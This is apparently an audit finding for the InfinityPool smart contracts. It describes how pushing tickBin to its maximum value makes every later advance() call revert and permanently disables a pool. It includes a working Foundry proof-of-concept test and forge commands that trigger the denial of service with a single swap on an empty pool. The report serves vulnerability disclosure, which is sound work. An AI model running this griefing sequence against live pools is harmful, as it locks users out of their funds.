# Pool is griefed if tickBin is equal to (1 << splits) - 1 

## Summary
This bug report discusses an issue in the code for EraBoxcarMidSum.sol, specifically on line 30. The bug occurs when the tickBin reaches its maximum value, causing all calls to InfinityPool.advance() on subsequent blocks to revert. This makes the pool unusable and can result in a denial-of-service attack on the pool. The bug can be triggered easily on pools with low liquidity. A proof of concept is provided, but it requires a large amount of gas to run. To fix the bug, the pool will need to be upgraded, as creating a new one for the same token pair/splits is not allowed. This is considered a medium severity bug.

## Details
## Bug Report: Infinity Pool Advance Reversion

## Context
**File:** EraBoxcarMidSum.sol#L30

## Description
If `tickBin` reaches its max value (equal to `(1 << splits) - 1`), all calls to `Infinity-Pool.advance()` on subsequent blocks will revert due to the check in `EraBoxcarMidSum.sol#L30`. This renders the pool unusable because `infinityPool.advance()` is called at the start of every state-changing function, and there is no way to adjust `tickBin`.

The impact would result in a total Denial of Service (DoS) for the pool, as all functions rely on `advance()` internally. Based on my understanding, this bug could be triggered cheaply on pools that are low in liquidity or empty. Consequently, an upgrade would be necessary to fix the pool because the factory does not allow creating another one for the same token pair/splits. Given that this is a pure griefing vector, I believe medium severity is appropriate.

## Proof of Concept
It is important to note that the following Proof of Concept (PoC) consumes an exorbitant amount of gas, which is a separate issue reported in #96. To demonstrate the issue mentioned in the current report, we assume that #96 was fixed and that `infinityPool.swap()` consumes a reasonable amount of gas. Make sure to pass `--gas-limit="18446744073709551615"` to the forge test.

To trigger the issue, call `swap` on an empty pool, bringing `tickBin` to its max value. This action is also feasible on pools with low liquidity.

### Steps to Run the Proof of Concept
1. Copy and paste the following into `test/cantina/poc_max_tick_grief.t.sol`.
2. Run with:
   ```bash
   forge test --match-path 'test/cantina/poc_max_tick_grief.t.sol' --gas-limit="18446744073709551615" -vv .
   ```
3. To see the cause of the revert with `-vvvv`, use:
   ```bash
   forge test --match-path 'test/cantina/poc_max_tick_grief.t.sol' --gas-limit="18446744073709551615" -vvvv | tail -c 10000
   ```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {InfinityPoolsBase} from "test/cantina/InfinityPoolsBase.t.sol";
import {console2} from "forge-std/console2.sol";
import {Quad, fromInt256, POSITIVE_ZERO, intoInt256} from "src/types/ABDKMathQuad/Quad.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import "src/interfaces/IInfinityPool.sol";
import "src/libraries/external/Structs.sol";
import {TUBS} from "src/Constants.sol";
import "src/libraries/helpers/PoolHelper.sol";
import "src/libraries/external/Spot.sol";
import "src/Constants.sol";
import "src/libraries/external/NewLoan.sol";

contract POC is InfinityPoolsBase {
    int256 startTub = 0;
    int256 stopTub = TUBS;

    function setUp() public override {
        super.setUp();
    }

    function inner_test_swap(bool direction, uint256 to_swap) internal returns (int256 a0, int256 a1) {
        token0.approve(address(infinityPool), type(uint256).max);
        token1.approve(address(infinityPool), type(uint256).max);
        console2.log("[inner_swap] pushing %e %s", to_swap, direction ? "token1" : "token0");
        Spot.SwapParams memory swap_params;
        swap_params.push = fromUint256(to_swap) / fromUint256(1e18);
        swap_params.token = direction;
        
        if (direction == false) {
            swap_params.limitPrice = LibOptQuad.Raw({val: POSITIVE_ZERO});
        } else {
            swap_params.limitPrice = LibOptQuad.Raw({val: POSITIVE_INFINITY});
        }

        int bal_0 = int(token0.balanceOf(address(this)));
        int bal_1 = int(token1.balanceOf(address(this)));
        
        (a0, a1) = infinityPool.swap(swap_params, address(this), bytes(""));
        
        console2.log("[inner_swap] bal delta token0 %e", int(token0.balanceOf(address(this))) - bal_0);
        console2.log("[inner_swap] bal delta token1 %e", int(token1.balanceOf(address(this))) - bal_1);
        console2.log("");
    }

    function test_max_tick_grief() public {
        Structs.LiquidityInfo memory info = infinityPool.getLiquidityInfo(startTub, stopTub);
        console2.log("[i] pool tick bin", info.tickBin);
        inner_test_swap(true, 5e18);
        info = infinityPool.getLiquidityInfo(startTub, stopTub);
        console2.log("[i] pool tick bin", info.tickBin);
        // advance()
        vm.warp(block.timestamp + 15);
        infinityPool.advance();
    }
}
